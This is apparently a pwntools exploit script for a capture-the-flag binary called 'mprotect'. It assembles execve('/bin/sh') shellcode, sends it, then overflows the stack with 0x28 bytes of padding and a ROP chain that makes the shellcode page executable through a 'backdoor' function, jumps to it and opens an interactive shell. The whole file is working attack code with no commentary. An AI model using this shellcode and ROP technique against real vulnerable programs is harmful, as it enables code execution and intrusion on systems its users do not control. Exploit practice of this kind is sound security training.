from pwn import *

file_name = "./mprotect"
context.arch = 'amd64'
p = process('./mprotect')
elf = ELF('./mprotect')
# p = gdb.debug(file_name)  
rdi_ret = 0x00000000040115E
backdoor = 0x000000000401163
payload = asm(
    '''
    mov rbx,0x68732f6e69622f;
    push rbx;
    mov rdi,rsp;
    xor rsi,rsi;
    xor rdx,rdx;
    mov rax,0x3b;
    syscall
    '''
)
payload = payload.ljust(0x200)
p.send(payload)

payload = b'a'*0x28+p64(rdi_ret)+p64(elf.symbols['shellcode']//0x1000*0x1000)+p64(backdoor)+p64(elf.symbols['shellcode'])
p.send(payload)
p.interactive()
